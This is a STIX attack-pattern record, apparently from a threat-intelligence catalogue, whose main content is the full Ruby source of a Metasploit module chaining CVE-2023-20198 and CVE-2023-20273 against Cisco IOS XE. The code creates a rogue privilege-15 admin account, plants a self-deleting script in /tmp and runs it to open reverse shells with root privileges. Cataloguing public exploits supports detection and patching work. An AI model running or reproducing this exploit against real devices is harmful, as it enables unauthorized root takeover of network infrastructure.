{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7f2256b0-af8e-45f6-9599-42260636cd74",
    "created": "2024-08-14T16:57:12.727331Z",
    "modified": "2024-08-14T16:57:12.727336Z",
    "name": "Cisco IOX XE Unauthenticated RCE Chain",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/misc/cisco_ios_xe_rce.rb",
            "external_id": "cisco_ios_xe_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-20198"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-20273"
        },
        {
            "source_name": "reference",
            "url": "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-iosxe-webui-privesc-j22SaA4z"
        },
        {
            "source_name": "reference",
            "url": "https://blog.talosintelligence.com/active-exploitation-of-cisco-ios-xe-software/"
        },
        {
            "source_name": "reference",
            "url": "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-iosxe-webui-privesc-j22SaA4z/cvrf/cisco-sa-iosxe-webui-privesc-j22SaA4z_cvrf.xml"
        },
        {
            "source_name": "reference",
            "url": "https://www.horizon3.ai/cisco-ios-xe-cve-2023-20198-theory-crafting/"
        },
        {
            "source_name": "reference",
            "url": "https://www.horizon3.ai/cisco-ios-xe-cve-2023-20198-deep-dive-and-poc/"
        },
        {
            "source_name": "reference",
            "url": "https://blog.leakix.net/2023/10/cisco-root-privesc/"
        },
        {
            "source_name": "reference",
            "url": "https://gist.github.com/rashimo/a0ef01bc02e5e9fdf46bc4f3b5193cbf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HTTP::CiscoIosXe\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Retry\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Cisco IOX XE Unauthenticated RCE Chain',\n        'Description' => %q{\n          This module leverages both CVE-2023-20198 and CVE-2023-20273 against vulnerable instances of Cisco IOS XE\n          devices which have the Web UI exposed. An attacker can execute a payload with root privileges.\n\n          The vulnerable IOS XE versions are:\n          16.1.1, 16.1.2, 16.1.3, 16.2.1, 16.2.2, 16.3.1, 16.3.2, 16.3.3, 16.3.1a, 16.3.4,\n          16.3.5, 16.3.5b, 16.3.6, 16.3.7, 16.3.8, 16.3.9, 16.3.10, 16.3.11, 16.4.1, 16.4.2,\n          16.4.3, 16.5.1, 16.5.1a, 16.5.1b, 16.5.2, 16.5.3, 16.6.1, 16.6.2, 16.6.3, 16.6.4,\n          16.6.5, 16.6.4s, 16.6.4a, 16.6.5a, 16.6.6, 16.6.5b, 16.6.7, 16.6.7a, 16.6.8, 16.6.9,\n          16.6.10, 16.7.1, 16.7.1a, 16.7.1b, 16.7.2, 16.7.3, 16.7.4, 16.8.1, 16.8.1a, 16.8.1b,\n          16.8.1s, 16.8.1c, 16.8.1d, 16.8.2, 16.8.1e, 16.8.3, 16.9.1, 16.9.2, 16.9.1a, 16.9.1b,\n          16.9.1s, 16.9.1c, 16.9.1d, 16.9.3, 16.9.2a, 16.9.2s, 16.9.3h, 16.9.4, 16.9.3s, 16.9.3a,\n          16.9.4c, 16.9.5, 16.9.5f, 16.9.6, 16.9.7, 16.9.8, 16.9.8a, 16.9.8b, 16.9.8c, 16.10.1,\n          16.10.1a, 16.10.1b, 16.10.1s, 16.10.1c, 16.10.1e, 16.10.1d, 16.10.2, 16.10.1f, 16.10.1g,\n          16.10.3, 16.11.1, 16.11.1a, 16.11.1b, 16.11.2, 16.11.1s, 16.11.1c, 16.12.1, 16.12.1s,\n          16.12.1a, 16.12.1c, 16.12.1w, 16.12.2, 16.12.1y, 16.12.2a, 16.12.3, 16.12.8, 16.12.2s,\n          16.12.1x, 16.12.1t, 16.12.2t, 16.12.4, 16.12.3s, 16.12.1z, 16.12.3a, 16.12.4a, 16.12.5,\n          16.12.6, 16.12.1z1, 16.12.5a, 16.12.5b, 16.12.1z2, 16.12.6a, 16.12.7, 16.12.9, 16.12.10,\n          17.1.1, 17.1.1a, 17.1.1s, 17.1.2, 17.1.1t, 17.1.3, 17.2.1, 17.2.1r, 17.2.1a, 17.2.1v,\n          17.2.2, 17.2.3, 17.3.1, 17.3.2, 17.3.3, 17.3.1a, 17.3.1w, 17.3.2a, 17.3.1x, 17.3.1z,\n          17.3.3a, 17.3.4, 17.3.5, 17.3.4a, 17.3.6, 17.3.4b, 17.3.4c, 17.3.5a, 17.3.5b, 17.3.7,\n          17.3.8, 17.4.1, 17.4.2, 17.4.1a, 17.4.1b, 17.4.1c, 17.4.2a, 17.5.1, 17.5.1a, 17.5.1b,\n          17.5.1c, 17.6.1, 17.6.2, 17.6.1w, 17.6.1a, 17.6.1x, 17.6.3, 17.6.1y, 17.6.1z, 17.6.3a,\n          17.6.4, 17.6.1z1, 17.6.5, 17.6.6, 17.7.1, 17.7.1a, 17.7.1b, 17.7.2, 17.10.1, 17.10.1a,\n          17.10.1b, 17.8.1, 17.8.1a, 17.9.1, 17.9.1w, 17.9.2, 17.9.1a, 17.9.1x, 17.9.1y, 17.9.3,\n          17.9.2a, 17.9.1x1, 17.9.3a, 17.9.4, 17.9.1y1, 17.11.1, 17.11.1a, 17.12.1, 17.12.1a,\n          17.11.99SW\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'sfewer-r7', # MSF Exploit\n        ],\n        'References' => [\n          ['CVE', '2023-20198'],\n          ['CVE', '2023-20273'],\n          # Vendor advisories.\n          ['URL', 'https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-iosxe-webui-privesc-j22SaA4z'],\n          ['URL', 'https://blog.talosintelligence.com/active-exploitation-of-cisco-ios-xe-software/'],\n          # Vendor list of (205) vulnerable versions.\n          ['URL', 'https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-iosxe-webui-privesc-j22SaA4z/cvrf/cisco-sa-iosxe-webui-privesc-j22SaA4z_cvrf.xml'],\n          # Technical details on CVE-2023-20198.\n          ['URL', 'https://www.horizon3.ai/cisco-ios-xe-cve-2023-20198-theory-crafting/'],\n          ['URL', 'https://www.horizon3.ai/cisco-ios-xe-cve-2023-20198-deep-dive-and-poc/'],\n          # Technical details on CVE-2023-20273.\n          ['URL', 'https://blog.leakix.net/2023/10/cisco-root-privesc/'],\n          # Full details of a successful exploitation attempt from a honey pot.\n          ['URL', 'https://gist.github.com/rashimo/a0ef01bc02e5e9fdf46bc4f3b5193cbf'],\n        ],\n        'DisclosureDate' => '2023-10-16',\n        'Privileged' => true,\n        'Platform' => %w[linux unix],\n        'Arch' => [ARCH_CMD],\n        'Targets' => [\n          [\n            # Tested against IOS XE 16.12.3 and 17.3.2 with the following payloads:\n            # cmd/linux/http/x64/meterpreter/reverse_tcp\n            # cmd/linux/http/x64/shell/reverse_tcp\n            # cmd/linux/http/x86/shell/reverse_tcp\n            'Linux Command',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_CMD]\n            },\n          ],\n          [\n            # Tested against IOS XE 16.12.3 and 17.3.2 with the following payloads:\n            # cmd/unix/python/meterpreter/reverse_tcp\n            # cmd/unix/reverse_bash\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => [ARCH_CMD]\n            },\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'RPORT' => 443,\n          'SSL' => true\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options(\n      [\n        # We allow a user to specify the VRF name to route traffic for the payloads network transport. The default of\n        # 'global' should work, but exposing this as an option will allow for usage in more complex network setups.\n        # A user could leverage the auxiliary module auxiliary/admin/http/cisco_ios_xe_cli_exec_cve_2023_20198 to\n        # inspect a devices configuration to see an appropriate VRF to use.\n        OptString.new('CISCO_VRF_NAME', [ true, \"The virtual routing and forwarding (vrf) name to use. Both 'fwd' or 'global' have been tested to work.\", 'global']),\n        # We may need to try and execute a command a second time if it fails the first time. This option is the maximum\n        # number of seconds to keep trying.\n        OptInt.new('CISCO_CMD_TIMEOUT', [true, 'The maximum timeout (in seconds) to wait when trying to execute a command.', 30])\n      ]\n    )\n  end\n\n  def check\n    # First, a get request to the root of the Web UI, this lets us verify the target is a Cisco IOS XE device with\n    # the Web UI exposed (which is the vulnerable component).\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri('webui')\n    )\n\n    return CheckCode::Unknown('Connection failed') unless res\n\n    # We look for one of two identifiers to ensure the request to /webui above returns something with Cisco in the content.\n    if res.code != 200 || (!res.body.include?('Cisco Systems, Inc.') || !res.headers['Content-Security-Policy']&.include?('cisco.com'))\n      return CheckCode::Unknown('Web UI not detected')\n    end\n\n    # By here we know the target is the IOS XE Web UI. We leverage the vulnerability to pull out the version number,\n    # so if this request succeeds, then we known the target is vulnerable.\n    res = run_cli_command('show version', Mode::PRIVILEGED_EXEC)\n\n    # If the above request failed, then the target is safe.\n    return CheckCode::Safe unless res\n\n    version = 'Cisco IOS XE Software'\n\n    # If we can pull out the version number via a regex, we do. If this fails, the target is still vulnerable\n    # (as the above call to run_cli_command succeeded), however maybe this firmware version uses a different format\n    # for the version information so our regex wont work.\n    # Note: Version numbers can have letters in them, e.g. 17.11.99SW or 16.12.1z2\n    if res =~ /(Cisco IOS XE Software, Version \\S+\\.\\S+\\.\\S+)/\n      version = Regexp.last_match(1)\n    end\n\n    CheckCode::Vulnerable(version)\n  end\n\n  def exploit\n    admin_username = rand_text_alpha(8)\n    admin_password = rand_text_alpha(8)\n\n    # Leverage CVE-2023-20198 to run an arbitrary CLI command and create a new admin user account.\n    unless run_cli_command(\"username #{admin_username} privilege 15 secret #{admin_password}\", Mode::GLOBAL_CONFIGURATION)\n      fail_with(Failure::UnexpectedReply, 'Failed to create admin user')\n    end\n\n    begin\n      print_status(\"Created privilege 15 user '#{admin_username}' with password '#{admin_password}'\")\n\n      # Leverage CVE-2023-20273 to run an arbitrary OS commands and bootstrap a Metasploit payload...\n\n      # A shell script to execute the Metasploit payload. Will delete itself upon execution.\n      bootstrap_script = \"#!/bin/sh\\nrm -f $0\\n#{payload.encoded}\"\n\n      # The location of our bootstrap script.\n      bootstrap_file = \"/tmp/#{Rex::Text.rand_text_alpha(8)}\"\n\n      # NOTE: Rather than chaining the commands with a semicolon, we run them separately. This allows version 16.* and\n      # 17.8 to work as expected. Version 16.* did not work when semi colons were present in the command line.\n\n      # Write a script to disk which will execute the Metasploit payload. We base64 encode it to avoid any problems\n      # with restricted chars, and leverage openssl to decode and write the contents to disk.\n      success = retry_until_truthy(timeout: datastore['CISCO_CMD_TIMEOUT']) do\n        next run_os_command(\"openssl enc -base64 -out #{bootstrap_file} -d <<< #{Base64.strict_encode64(bootstrap_script)}\", admin_username, admin_password)\n      end\n\n      unless success\n        fail_with(Failure::UnexpectedReply, 'Failed to plant the bootstrap file')\n      end\n\n      # Make the script executable.\n      success = retry_until_truthy(timeout: datastore['CISCO_CMD_TIMEOUT']) do\n        next run_os_command(\"chmod +x #{bootstrap_file}\", admin_username, admin_password)\n      end\n\n      unless success\n        fail_with(Failure::UnexpectedReply, 'Failed to chmod the bootstrap file')\n      end\n\n      # Execute our bootstrap script via mcp_chvrf.sh, and with 'global' virtual routing and forwarding (vrf) by\n      # default. The VRF allows the executed script to route its network traffic back the the framework. The map_chvrf.sh\n      # scripts wraps a call to /usr/sbin/chvrf, which will conveniently fork the command we supply.\n      success = retry_until_truthy(timeout: datastore['CISCO_CMD_TIMEOUT']) do\n        next run_os_command(\"/usr/binos/conf/mcp_chvrf.sh #{datastore['CISCO_VRF_NAME']} sh #{bootstrap_file}\", admin_username, admin_password)\n      end\n\n      unless success\n        fail_with(Failure::UnexpectedReply, 'Failed to execute the bootstrap file')\n      end\n    ensure\n      print_status(\"Removing user '#{admin_username}'\")\n\n      # Leverage CVE-2023-20198 to remove the admin account we previously created.\n      unless run_cli_command(\"no username #{admin_username}\", Mode::GLOBAL_CONFIGURATION)\n        print_warning('Failed to remove user')\n      end\n    end\n  end\n\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2023-10-16",
    "x_mitre_platforms": [
        "unix'"
    ]
}